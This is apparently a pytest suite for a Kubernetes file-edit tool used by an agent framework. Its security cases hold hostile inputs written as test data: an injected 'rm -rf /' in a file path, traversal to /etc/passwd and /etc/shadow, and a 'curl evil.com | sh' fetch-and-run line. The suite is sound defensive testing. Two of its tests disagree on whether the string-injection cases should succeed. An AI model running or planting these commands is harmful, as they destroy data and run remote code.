import pytest
import json
from typing import Tuple, Any, Dict
from workers.tools.cc_tools.file_edit_tool.k8s_file_edit_tool import K8sFileEditTool
from kodo import KubernetesManager

def _sh(cmd: str) -> str:
    return f"/bin/sh -lc {json.dumps(cmd)}"

def _write_file_cmd(path: str, content: str) -> str:
    marker = "EOF_ARL_TEST_7d3c0b6a"
    return f"mkdir -p $(dirname '{path}') && cat > '{path}' <<'{marker}'\n{content}\n{marker}\n"

def _write_file(k8s: KubernetesManager, pod: str, path: str, content: str) -> Tuple[str, Any]:
    return k8s.execute_command(pod, _sh(_write_file_cmd(path, content)))

def _rm_file(k8s: KubernetesManager, pod: str, path: str) -> Tuple[str, Any]:
    return k8s.execute_command(pod, _sh(f"rm -f '{path}'"))

def _cat(k8s: KubernetesManager, pod: str, path: str) -> Tuple[str, Any]:
    return k8s.execute_command(pod, _sh(f"cat '{path}'"))

def _exists(k8s: KubernetesManager, pod: str, path: str) -> Tuple[bool, str]:
    out, code = k8s.execute_command(pod, _sh(f"test -f '{path}' && echo exists || echo not_exists"))
    if str(code) != "0":
        return False, out.strip()
    return out.strip() == "exists", out.strip()

@pytest.fixture(scope="session")
def k8s_manager():
    return KubernetesManager(namespace="default")

@pytest.fixture(scope="session")
def tool_instance():
    cfg: Dict[str, Any] = {
        "pod_name": "target-pod",
        "namespace": "default",
        "base_dir": "/app",
    }
    return K8sFileEditTool(cfg)

@pytest.fixture(autouse=True)
def clean_app_dir(k8s_manager):
    pod = "target-pod"
    k8s_manager.execute_command(pod, _sh("mkdir -p /app"))
    targets = [
        "/app/main.py",
        "/app/utils.py",
        "/app/config.json",
        "/app/test.py",
        "/app/existing_file.py",
        "/app/notebook.ipynb",
        "/app/duplicate_test.py",
        "/app/relative_file.txt",
    ]
    for p in targets:
        _rm_file(k8s_manager, pod, p)
    yield
    for p in targets:
        _rm_file(k8s_manager, pod, p)

def extract_test_params():
    return [
        ("Happy Path: Create a new Python file", "Happy Path", {
            "file_path": "/app/main.py",
            "old_string": "",
            "new_string": "def main():\n    print('Hello World!')\n\nif __name__ == '__main__':\n    main()"
        }),
        ("Happy Path: Update existing function with proper context", "Happy Path", {
            "file_path": "/app/utils.py",
            "old_string": "def calculate(x, y):\n    return x + y",
            "new_string": "def calculate(x, y):\n    # Added validation\n    if not isinstance(x, (int, float)) or not isinstance(y, (int, float)):\n        raise TypeError('Arguments must be numbers')\n    return x + y"
        }),
        ("Happy Path: Delete content by replacing with empty string", "Happy Path", {
            "file_path": "/app/config.json",
            "old_string": "{\n  \"debug\": true,\n  \"verbose\": false\n}",
            "new_string": ""
        }),
        ("Sad Path: Missing required 'file_path' parameter", "Sad Path", {
            "old_string": "old content",
            "new_string": "new content"
        }),
        ("Sad Path: Missing required 'old_string' parameter", "Sad Path", {
            "file_path": "/app/test.py",
            "new_string": "new content"
        }),
        ("Sad Path: Missing required 'new_string' parameter", "Sad Path", {
            "file_path": "/app/test.py",
            "old_string": "old content"
        }),
        ("Sad Path: Wrong parameter type - file_path as number", "Sad Path", {
            "file_path": 12345,
            "old_string": "old content",
            "new_string": "new content"
        }),
        ("Sad Path: Wrong parameter type - old_string as boolean", "Sad Path", {
            "file_path": "/app/test.py",
            "old_string": True,
            "new_string": "new content"
        }),
        ("Sad Path: Wrong parameter type - new_string as array", "Sad Path", {
            "file_path": "/app/test.py",
            "old_string": "old content",
            "new_string": ["line1", "line2"]
        }),
        ("Sad Path: Empty file_path string", "Sad Path", {
            "file_path": "",
            "old_string": "old content",
            "new_string": "new content"
        }),
        ("Sad Path: Identical old_string and new_string", "Sad Path", {
            "file_path": "/app/test.py",
            "old_string": "same content",
            "new_string": "same content"
        }),
        ("Sad Path: Attempt to create file with old_string when file exists", "Sad Path", {
            "file_path": "/app/existing_file.py",
            "old_string": "",
            "new_string": "new file content"
        }),
        ("Sad Path: Jupyter notebook file extension", "Sad Path", {
            "file_path": "/app/notebook.ipynb",
            "old_string": "old",
            "new_string": "new"
        }),
        ("Security: Command injection attempt in file_path", "Security", {
            "file_path": "/app/test.py; rm -rf /; echo 'pwned'",
            "old_string": "old content",
            "new_string": "new content"
        }),
        ("Security: Path traversal attempt in file_path", "Security", {
            "file_path": "../../etc/passwd",
            "old_string": "root:x:0:0:root:/root:/bin/bash",
            "new_string": "root:x:0:0:hacked:/root:/bin/bash"
        }),
        ("Security: Command injection attempt in old_string", "Security", {
            "file_path": "/app/test.py",
            "old_string": "print('hello'); os.system('rm -rf /')",
            "new_string": "print('safe content')"
        }),
        ("Security: Command injection attempt in new_string", "Security", {
            "file_path": "/app/test.py",
            "old_string": "print('hello')",
            "new_string": "import os; os.system('curl evil.com | sh')"
        }),
        ("Security: Null byte injection in file_path", "Security", {
            "file_path": "/app/safe.txt\u0000../../etc/shadow",
            "old_string": "safe content",
            "new_string": "potentially malicious"
        }),
    ]

@pytest.mark.parametrize("case_name,category,parameters", extract_test_params())
@pytest.mark.asyncio
async def test_k8s_file_edit_tool(case_name, category, parameters, tool_instance, k8s_manager, clean_app_dir):
    pod_name = "target-pod"
    if category == "Happy Path":
        if "Update existing function" in case_name:
            utils_content = "def calculate(x, y):\n    return x + y\n\ndef other_function():\n    pass"
            _write_file(k8s_manager, pod_name, "/app/utils.py", utils_content)
        elif "Delete content" in case_name:
            config_content = "{\n  \"debug\": true,\n  \"verbose\": false\n}"
            _write_file(k8s_manager, pod_name, "/app/config.json", config_content)
    if "file exists" in case_name:
        _write_file(k8s_manager, pod_name, "/app/existing_file.py", "existing content")

    result = await tool_instance.execute_tool(instance_id="test-instance", parameters=parameters)

    if category == "Happy Path":
        assert result.success is True, f"Expected success=True, got {result.success}. Error: {getattr(result, 'error', 'No error')}"
        assert hasattr(result, "result")
        assert result.result is not None
        assert hasattr(result, "metrics")
        file_path = parameters["file_path"]
        old_string = parameters["old_string"]
        new_string = parameters["new_string"]
        if old_string == "":
            ro, rc = _cat(k8s_manager, pod_name, file_path)
            assert str(rc) == "0", f"Failed to read created file: {ro}"
            assert ro == new_string, f"File content mismatch. Expected: {new_string}, Got: {ro}"
        else:
            ro, rc = _cat(k8s_manager, pod_name, file_path)
            assert str(rc) == "0", f"Failed to read modified file: {ro}"
            if new_string == "":
                assert ro == "", f"Expected empty file, got: {ro}"
            else:
                assert new_string in ro, f"New string not found in file content: {ro}"
                assert old_string not in ro, f"Old string still found in file content: {ro}"
    else:
        assert result.success is False, f"Expected success=False for {category} case, got {result.success}"
        assert hasattr(result, "error")
        assert result.error is not None
        assert len(result.error) > 0
        if category == "Security":
            for mal in ["/app/pwned", "/app/malicious"]:
                ex, raw = _exists(k8s_manager, pod_name, mal)
                assert ex is False, f"Malicious file {mal} was created"

@pytest.mark.asyncio
async def test_tool_schema_validation(tool_instance):
    schema = tool_instance.get_openai_tool_schema()
    if isinstance(schema, dict):
        fn = schema.get("function")
        assert fn is not None
        assert fn.get("name") == "k8s_file_edit"
        params = fn.get("parameters")
        assert isinstance(params, dict)
        props = params.get("properties")
        req = params.get("required")
    else:
        fn = getattr(schema, "function", None)
        assert fn is not None
        assert getattr(fn, "name", None) == "k8s_file_edit"
        params = getattr(fn, "parameters", None)
        props = getattr(params, "properties", None)
        req = getattr(params, "required", None)
    assert "file_path" in props
    assert "old_string" in props
    assert "new_string" in props
    assert set(req) == {"file_path", "old_string", "new_string"}

@pytest.mark.asyncio
async def test_multiple_occurrences_handling(tool_instance, k8s_manager, clean_app_dir):
    pod = "target-pod"
    content = "print('hello')\nprint('hello')\nprint('world')"
    _write_file(k8s_manager, pod, "/app/duplicate_test.py", content)
    parameters = {"file_path": "/app/duplicate_test.py", "old_string": "print('hello')", "new_string": "print('hi')"}
    result = await tool_instance.execute_tool(instance_id="test-instance", parameters=parameters)
    assert result.success is False
    assert "Found 2 matches" in result.error or "supports replacing exactly one occurrence" in result.error

@pytest.mark.asyncio
async def test_nonexistent_file_handling(tool_instance, clean_app_dir):
    parameters = {"file_path": "/app/nonexistent.py", "old_string": "some content", "new_string": "new content"}
    result = await tool_instance.execute_tool(instance_id="test-instance", parameters=parameters)
    assert result.success is False
    assert "File does not exist." in result.error

@pytest.mark.asyncio
async def test_relative_path_handling(tool_instance, k8s_manager, clean_app_dir):
    pod = "target-pod"
    _write_file(k8s_manager, pod, "/app/relative_file.txt", "relative content")
    parameters = {"file_path": "relative_file.txt", "old_string": "relative content", "new_string": "updated content"}
    result = await tool_instance.execute_tool(instance_id="test-instance", parameters=parameters)
    assert result.success is True, f"Should handle relative paths successfully: {getattr(result, 'error', 'No error')}"
    ro, rc = _cat(k8s_manager, pod, "/app/relative_file.txt")
    assert str(rc) == "0"
    assert ro == "updated content"

@pytest.mark.asyncio
async def test_security_invalid_paths(tool_instance, clean_app_dir):
    parameters = {"file_path": "/app/test.py; rm -rf /; echo 'pwned'", "old_string": "old content", "new_string": "new content"}
    r1 = await tool_instance.execute_tool(instance_id="test-instance", parameters=parameters)
    assert r1.success is False
    assert "Invalid file path" in r1.error

    parameters = {"file_path": "../../etc/passwd", "old_string": "x", "new_string": "y"}
    r2 = await tool_instance.execute_tool(instance_id="test-instance", parameters=parameters)
    assert r2.success is False
    assert "escapes base directory" in r2.error

    parameters = {"file_path": "/app/safe.txt\u0000../../etc/shadow", "old_string": "x", "new_string": "y"}
    r3 = await tool_instance.execute_tool(instance_id="test-instance", parameters=parameters)
    assert r3.success is False
    assert "contains null byte" in r3.error

@pytest.mark.asyncio
async def test_security_strings_only(tool_instance, k8s_manager, clean_app_dir):
    pod = "target-pod"
    _write_file(k8s_manager, pod, "/app/test.py", "print('hello'); os.system('rm -rf /')")
    parameters = {"file_path": "/app/test.py", "old_string": "print('hello'); os.system('rm -rf /')", "new_string": "print('safe content')"}
    r1 = await tool_instance.execute_tool(instance_id="test-instance", parameters=parameters)
    assert r1.success is True
    ro1, rc1 = _cat(k8s_manager, pod, "/app/test.py")
    assert str(rc1) == "0"
    assert "print('safe content')" in ro1
    assert "os.system('rm -rf /')" not in ro1

    _write_file(k8s_manager, pod, "/app/test.py", "print('hello')")
    parameters = {"file_path": "/app/test.py", "old_string": "print('hello')", "new_string": "import os; os.system('curl evil.com | sh')"}
    r2 = await tool_instance.execute_tool(instance_id="test-instance", parameters=parameters)
    assert r2.success is True
    ro2, rc2 = _cat(k8s_manager, pod, "/app/test.py")
    assert str(rc2) == "0"
    assert "import os; os.system('curl evil.com | sh')" in ro2
